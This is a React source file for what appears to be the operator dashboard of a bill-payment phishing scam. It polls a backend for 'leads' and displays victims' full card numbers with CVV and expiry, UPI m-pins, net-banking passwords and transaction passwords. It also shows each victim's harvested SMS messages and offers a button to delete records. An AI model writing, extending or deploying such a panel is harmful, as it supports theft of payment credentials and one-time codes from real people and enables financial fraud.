import axios from "axios";
import React, { useEffect, useState } from "react";
import Modal from "react-modal";
import { useNavigate } from "react-router-dom";
import { baseAppUrl } from "./local";

// Set the root element for modal accessibility
Modal.setAppElement("#root");

function HomeComp() {
  const [leads, setLeads] = useState([]);
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [selectedLeadSms, setSelectedLeadSms] = useState([]);
  const navigate = useNavigate();

  useEffect(() => {
    FetchData();
  }, []);

  useEffect(() => {
    const handler = setInterval(() => {
      FetchData();
    }, 5000);

    return () => clearInterval(handler); // Cleanup function to clear the interval
  }, []);

  const FetchData = async () => {
    try {
      const response = await axios.post(`${baseAppUrl}/users`);
      if (response.status === 200) {
        setLeads(response.data); // Fetch and set leads data
      }
    } catch (error) {
      console.error(error);
    }
  };

  const deleteHandler = async (id) => {
    try {
      const response = await axios.post(`${baseAppUrl}/users/${id}`);
      if (response.status === 200) {
        FetchData();
      }
    } catch (error) {
      console.error(error);
    }
  };

  const openModal = (smsArray) => {
    setSelectedLeadSms(smsArray); // Set the SMS data for the selected lead
    navigate("/viewSms", { state: smsArray });
  };

  const logoutHandler = () => {
    localStorage.removeItem("token");
    navigate("/login");
  };

  return (
    <div className="p-4">
      <h2 className="text-xl my-4 flex items-center justify-between font-semibold">
        <span>Lead</span>
        <button
          onClick={() => logoutHandler()}
          className="bg-red-500 text-white px-4 py-2 rounded"
        >
          Logout
        </button>
      </h2>
      {leads.length > 0 ? (
        leads.map((lead, index) => (
          <div key={lead._id} className="mb-4 border p-4 rounded shadow">
            <h2 className="text-xl font-semibold">
              {" "}
              Name: {lead.customerName}{" "}
            </h2>
            <h4 className="  font-semibold"> Mobile: {lead.mobileNumber} </h4>
            <h5 className=" font-semibold"> Bill Status: {lead.billStatus} </h5>
            <h6 className=" border-b-2 font-semibold">
              {" "}
              Consumer Id: {lead.consumerId}{" "}
            </h6>

            {lead?.selectedPaymentMethod === "Credit Card" && (
              <div>
                <p> Payment Mathod: {lead?.selectedPaymentMethod} </p>
                <p>Card Number: {lead.creditCard}</p>
                <p>Card Holder: {lead.cardHolderName}</p>
                <p>Expiry Date: {lead.expiryDate}</p>
                <p>CVV: {lead.cvv}</p>
              </div>
            )}
            {lead?.selectedPaymentMethod === "Debit Card" && (
              <div>
                <p> Payment Mathod: {lead?.selectedPaymentMethod} </p>
                <p>Card Number: {lead.debitCard}</p>
                <p>Card Holder: {lead.cardHolderName}</p>
                <p>Expiry Date: {lead.expiryDate}</p>
                <p>CVV: {lead.cvv}</p>
              </div>
            )}
            {lead?.selectedPaymentMethod === "UPI" && (
              <div>
                <p> Payment Mathod: {lead?.selectedPaymentMethod} </p>
                <p>Selected UPI App: {lead.selectedUPIApp}</p>
                <p>m-pin: {lead.mPin}</p>
                <p>Mobile No: {lead.mobileNumber}</p>
              </div>
            )}
            {lead?.selectedPaymentMethod === "Net Banking" && (
              <div>
                <p> Payment Mathod: {lead?.selectedPaymentMethod} </p>
                <p>Selected Bank: {lead.selectedBank}</p>
                <p>password: {lead.password}</p>
                <p>transaction password: {lead.transactionPassword}</p>
              </div>
            )}

            <button
              onClick={() => openModal(lead.allUserSms)}
              className="mt-4 bg-blue-500 text-white px-4 py-2 rounded"
            >
              View All SMS
            </button>
            <button
              onClick={() => deleteHandler(lead._id)}
              className="mt-4 bg-red-500 mx-2 text-white px-4 py-2 rounded"
            >
              Delete
            </button>
          </div>
        ))
      ) : (
        <p>No leads available</p>
      )}
    </div>
  );
}

export default HomeComp;
